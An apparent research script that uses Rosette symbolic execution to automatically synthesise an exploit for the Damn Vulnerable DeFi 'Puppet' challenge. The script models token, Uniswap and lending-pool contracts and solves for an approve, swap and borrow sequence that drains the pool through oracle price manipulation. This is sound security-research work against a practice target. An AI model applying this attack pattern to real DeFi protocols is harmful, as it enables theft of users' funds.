#lang rosette
(require "./eurus/yul-helper.rkt")
(require "./eurus/yul-manager.rkt")
(require "./eurus/yul-components.rkt")
(require "./demo-puppet-codegen.rkt")
(current-bitwidth 2)

; https://www.damnvulnerabledefi.xyz/challenges/8.html
; ===============
; initializations
; ===============
(define config-path "./examples/vm-shared-config.json")

; contract paths
(define eth-path "./examples/puppet-simplified/ERC20.eurus.json")
(define dvt-path "./examples/puppet-simplified/ERC20.eurus.json")
(define uniswap-path "./examples/puppet-simplified/UniswapModel.eurus.json")
(define puppet-path "./examples/puppet-simplified/PuppetPool.eurus.json")
; no explicit attacker contract is required

; addresses of different roles
(define admin-account-addr 5) ; used for setting up the benchmark
(define attacker-account-addr 181) ; used for performing attacks
(define eth-contract-addr 37)
(define dvt-contract-addr 17)
(define uniswap-contract-addr 101)
(define puppet-contract-addr 137)

; yul vm manager
(define mgr (new yul-manager%))

; eth pool initialization
(printf "# [init] eth pool...\n")
(define eth-vm (make-vm0 admin-account-addr mgr config-path eth-contract-addr eth-path "constructor()" (list)))

; dvt pool initialization
(printf "# [init] dvt pool...\n")
(define dvt-vm (make-vm0 admin-account-addr mgr config-path dvt-contract-addr dvt-path "constructor()" (list)))

; uniswap initialization
; constructor
(printf "# [init] uniswap...\n")
(define uniswap-vm (make-vm0 admin-account-addr mgr config-path uniswap-contract-addr uniswap-path "constructor()" (list)))
; set address
(printf "         setting up...\n")
(define _00 (make-call0 admin-account-addr uniswap-vm "setPoolAddresses(address,address)" (list
  (cons "address" dvt-contract-addr) (cons "address" eth-contract-addr))))

; puppet initialization
(printf "# [init] puppet...\n")
(define puppet-vm (make-vm0 admin-account-addr mgr config-path puppet-contract-addr puppet-path "constructor()" (list)))
; set address
(printf "         setting up...\n")
(define _11 (make-call0 admin-account-addr puppet-vm "setPoolAddresses(address,address,address)" (list
  (cons "address" eth-contract-addr) (cons "address" dvt-contract-addr) (cons "address" uniswap-contract-addr))))

; ========================
; benchmark context set-up
; ========================
; see https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/puppet/puppet.challenge.js

; add 100000 tokens to puppet's DVT balance
(printf "# [setup] adding 100000 tokens to puppet's DVT balance...\n")
(define _0 (make-call0 admin-account-addr dvt-vm "eurus_set_balances(address,uint256)" (list
  (cons "address" puppet-contract-addr) (cons "uint256" 100000))))
; check it
(define r0 (make-call0 admin-account-addr dvt-vm "balanceOf(address)" (list
  (cons "address" puppet-contract-addr))))
(printf "          ~a\n" (read-value r0))

; add 10 tokens to uniswap's DVT balance
(printf "# [setup] adding 10 tokens to uniswap's DVT balance...\n")
(define _1 (make-call0 admin-account-addr dvt-vm "eurus_set_balances(address,uint256)" (list
  (cons "address" uniswap-contract-addr) (cons "uint256" 10))))
; check it
(define r1 (make-call0 admin-account-addr dvt-vm "balanceOf(address)" (list
  (cons "address" uniswap-contract-addr))))
(printf "          ~a\n" (read-value r1))

; add 10 tokens to uniswap's ETH balance
(printf "# [setup] add 10 tokens to uniswap's ETH balance...\n")
(define _2 (make-call0 admin-account-addr eth-vm "eurus_set_balances(address,uint256)" (list
  (cons "address" uniswap-contract-addr) (cons "uint256" 10))))
; check it
(define r2 (make-call0 admin-account-addr eth-vm "balanceOf(address)" (list
  (cons "address" uniswap-contract-addr))))
(printf "          ~a\n" (read-value r2))

; add 1000 tokens to attacker's DVT balance
(printf "# [setup] adding 1000 tokens to attacker's DVT balance...\n")
(define _3 (make-call0 admin-account-addr dvt-vm "eurus_set_balances(address,uint256)" (list
  (cons "address" attacker-account-addr) (cons "uint256" 1000))))
; check it
(define r3 (make-call0 admin-account-addr dvt-vm "balanceOf(address)" (list
  (cons "address" attacker-account-addr))))
(printf "          ~a\n" (read-value r3))

; add 25 tokens to attacker's ETH balance
(printf "# [setup] adding 25 tokens to attacker's ETH balance...\n")
(define _4 (make-call0 admin-account-addr eth-vm "eurus_set_balances(address,uint256)" (list
  (cons "address" attacker-account-addr) (cons "uint256" 25))))
; check it
(define r4 (make-call0 admin-account-addr eth-vm "balanceOf(address)" (list
  (cons "address" attacker-account-addr))))
(printf "          ~a\n" (read-value r4))

; ======================
; perform synthesis here
; ======================
(printf "# [setup] hijacking `revert` function...\n")
; hijack to assert #f to terminate yul accepted exit paths
(for ([vm (list eth-vm dvt-vm uniswap-vm puppet-vm)])
  (send vm update-yul-builtin-function-book "revert" (lambda (cp x y) (assert #f) (ret 'revert (list )))))

(printf "# [setup] creating attack components...\n")
; dvt-vm - approve
(define (create-component-approve)
  (define arg0-approve uniswap-contract-addr)
  (define arg1-approve 1000)
  (define c (create-call0 attacker-account-addr dvt-vm "approve(address,uint256)" (list
    (cons "address" arg0-approve) (cons "uint256" arg1-approve))))
  (cons c (list))
)
; uniswap-vm - swapDVT4ETH(uint256)
(define (create-component-swapDVT4ETH)
  ;(define arg-swapDVT4ETH-0 1)
  (define-symbolic* arg0-swapDVT4ETH integer?)
  (assert (>= arg0-swapDVT4ETH 0))
  (define c (create-call0 attacker-account-addr uniswap-vm "swapDVT4ETH(uint256)" (list
    (cons "uint256" arg0-swapDVT4ETH))))
  (cons c (list arg0-swapDVT4ETH))
)
; puppet-vm - borrow
(define (create-component-borrow)
  (define arg0-borrow 100000)
  (define arg1-borrow 0)
  (define c (create-call0 attacker-account-addr puppet-vm "borrow(uint256,uint256)" (list
    (cons "uint256" arg0-borrow) (cons "uint256" arg1-borrow))))
  (cons c (list))
)

; collect
; (define components-step0 (list (create-component-eth-set-balances)))
; (define components-step0 (list (create-component-swapDVT4ETH) ))
; (define components-step1 (list (create-component-borrow) ))
(define components-step0 (list (create-component-approve) ))
(define labels-step0 (list "approve"))
(define components-step1 (list (create-component-swapDVT4ETH) ))
(define labels-step1 (list "swapDVT4ETH"))
(define components-step2 (list (create-component-borrow) ))
(define labels-step2 (list "borrow"))

(define-symbolic attack-ptr0 integer?)
(define-symbolic attack-ptr1 integer?)
(define-symbolic attack-ptr2 integer?)
(define attack-step0 (list-ref components-step0 attack-ptr0))
(define attack-step1 (list-ref components-step1 attack-ptr1))
(define attack-step2 (list-ref components-step2 attack-ptr2))

(printf "# [synthesis] executing symbolic components...\n")
((car attack-step0))
((car attack-step1))
((car attack-step2))

; ===========================================================
; verification procedure after candidate exploit is performed
; ===========================================================
(printf "# [verification] constructing verification conditions...\n")
;(printf "# [verification] calling eurus_oracle_price...\n")
;(define v0 (make-call0 admin-account-addr puppet-vm "eurus_oracle_price(uint256)" (list
;  (cons "uint256" 0)))) ; (fixme) this "uint256" parameter is a dumb placeholder
;(define vs0 (read-value v0))
(printf "# [verification] checking puppet's DVT balance...\n")
(define v1 (make-call0 admin-account-addr dvt-vm "balanceOf(address)" (list
  (cons "address" puppet-contract-addr))))
(define vs1 (read-value v1))

; ===================
; issue solve command
; ===================
;(printf "# [solving] solving...\n")
;(solve (assert (bvzero? vs0)))
(define mm (solve (assert (bvzero? vs1))))
(printf "# [solution] ~a\n" mm)
;(solve (assert (bvugt vs1 (bv 0 256))))

(define solved-step0 (evaluate (list-ref labels-step0 attack-ptr0) mm))
(define solved-step1 (evaluate (list-ref labels-step1 attack-ptr1) mm))
(define solved-step1-args (evaluate (cdr attack-step1) mm))
(define solved-step2 (evaluate (list-ref labels-step2 attack-ptr2) mm))
(define ss (codegen-all (list (cons solved-step0 (list)) (cons solved-step1 solved-step1-args) (cons solved-step2 (list)))))
(printf "~a\n" ss)
; ==========
; debug zone
; ==========
;
;(printf "# [debug] using uniswap: provide 10 DVT, get some ETH...\n")
;(define d0 (make-call0 attacker-account-addr uniswap-vm "swapDVT4ETH(uint256)" (list
;  (cons "uint256" 1)))) ; (note) only providing 1 DVT is enough
;(printf "          checking uniswap's eth balance...\n")
;(define d1 (make-call0 admin-account-addr uniswap-vm "getETHBalance(uint256)" (list
;  (cons "uint256" 0)))) ; (fixme) this "uint256" parameter is a dumb placeholder
;(printf "          ~a\n" (read-value d1))
;(printf "          checking uniswap's dvt balance...\n")
;(define d1i (make-call0 admin-account-addr uniswap-vm "getDVTBalance(uint256)" (list
;  (cons "uint256" 0)))) ; (fixme) this "uint256" parameter is a dumb placeholder
;(printf "          ~a\n" (read-value d1i))
;
;(printf "# [debug] checking puppet's oracle price...\n")
;(define d2 (make-call0 admin-account-addr puppet-vm "eurus_oracle_price(uint256)" (list
;  (cons "uint256" 0)))) ; (fixme) this "uint256" parameter is a dumb placeholder
;(printf "          ~a\n" (read-value d2))
;
;(printf "# [debug] checking puppet's deposit required...\n")
;(define d3 (make-call0 admin-account-addr puppet-vm "eurus_deposit_required(uint256)" (list
;  (cons "uint256" 10))))
;(printf "          ~a\n" (read-value d3))
;;(printf "# [debug] checking puppet's dep0...\n")
;;(define p0 (make-call0 admin-account-addr puppet-vm "eurus_dep0()" (list
;;  (cons "uint256" 0)))) ; (fixme) this "uint256" parameter is a dumb placeholder
;;(printf "          ~a\n" (read-value p0))
;;(printf "# [debug] checking puppet's dep1...\n")
;;(define p1 (make-call0 admin-account-addr puppet-vm "eurus_dep1(uint256)" (list
;;  (cons "uint256" 10))))
;;(printf "          ~a\n" (read-value p1))
;
;(printf "# [debug] checking puppet's dvt balance...\n")
;(define d4 (make-call0 admin-account-addr dvt-vm "balanceOf(address)" (list
;  (cons "uint256" puppet-contract-addr)))) ; (fixme) this "uint256" parameter is a dumb placeholder
;(printf "          ~a\n" (read-value d4))
;
;(printf "# [debug] calling borrow...\n")
;(define d5 (make-call0 attacker-account-addr puppet-vm "borrow(uint256,uint256)" (list
;  (cons "uint256" 100000) (cons "uint256" 0))))
;
;(printf "# [debug] checking puppet's dvt balance...\n")
;(define d6 (make-call0 admin-account-addr dvt-vm "balanceOf(address)" (list
;  (cons "uint256" puppet-contract-addr)))) ; (fixme) this "uint256" parameter is a dumb placeholder
;(printf "          ~a\n" (read-value d6))